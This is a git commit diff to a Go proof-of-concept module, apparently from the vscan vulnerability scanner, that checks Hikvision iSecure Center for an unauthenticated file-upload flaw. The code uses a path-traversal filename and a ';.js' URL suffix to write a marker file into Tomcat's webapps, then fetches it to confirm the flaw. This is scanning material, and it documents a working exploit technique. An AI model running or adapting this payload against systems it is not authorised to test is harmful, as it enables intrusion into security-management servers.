00b6c7dc2ed80b9319f7b5f5786634332974a71a
york-cmd <958913001@qq.com>
2023-07-01 09:15:09 +0800

    海康威视综合安防管理平台文件上传漏洞-解决bug问题

--- pocs_go/HIKVISION/HIKVISION_iSecure_Center_api_upload_rce.go
+++ pocs_go/HIKVISION/HIKVISION_iSecure_Center_api_upload_rce.go
@@ -4,27 +4,21 @@ import (
 	"fmt"
 	"github.com/veo/vscan/pkg"
 	"strings"
-	"time"
 )
 
 func Hikvision_api_files_rce(u string) bool {
 
-	payload := `--ea26cdac4990498b32d7a95ce5a5135c
-Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/2d7a95ce5a5135ca.txt"    
-Content-Type: application/octet-stream
-
-332299402
---ea26cdac4990498b32d7a95ce5a5135c--`
+	var payload = "--ea26cdac4990498b32d7a95ce5a5135c\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/dac4990498b32d7a95ce5a512.txt\"\r\n\r\nea26cdac4990498b32d7a95ce5a5135c\r\n--ea26cdac4990498b32d7a95ce5a5135c--"
 
 	header := make(map[string]string)
 	header["Content-Type"] = "multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c"
 
 	if req, err := pkg.HttpRequset(u+"/center/api/files;.js", "POST", payload, false, header); err == nil {
-		time.Sleep(time.Second * 5)
-		if req.StatusCode = 200; err == nil {
-			if req2, err := pkg.HttpRequset(u+"/clusterMgr/2d7a95ce5a5135ca.txt;.js", "GET", "", false, nil); err == nil {
-				if req2.StatusCode == 200 && strings.Contains(req2.Body, "332299402") {
-					pkg.GoPocLog(fmt.Sprintf("Found vuln hikvision api_file_upload_rce|%s\n", u+"/clusterMgr/2d7a95ce5a5135ca.txt;.js"))
+		//pkg.GoPocLog(req.Body)
+		if req.StatusCode == 200 {
+			if req2, err := pkg.HttpRequset(u+"/clusterMgr/dac4990498b32d7a95ce5a512.txt;.js", "GET", "", false, nil); err == nil {
+				if req2.StatusCode == 200 && strings.Contains(req2.Body, "ea26cdac4990498b32d7a95ce5a5135c") {
+					pkg.GoPocLog(fmt.Sprintf("Found vuln hikvision api_file_upload_rce|%s\n", u+"/clusterMgr/dac4990498b32d7a95ce5a512.txt;.js"))
 					return true
 				}
 			}
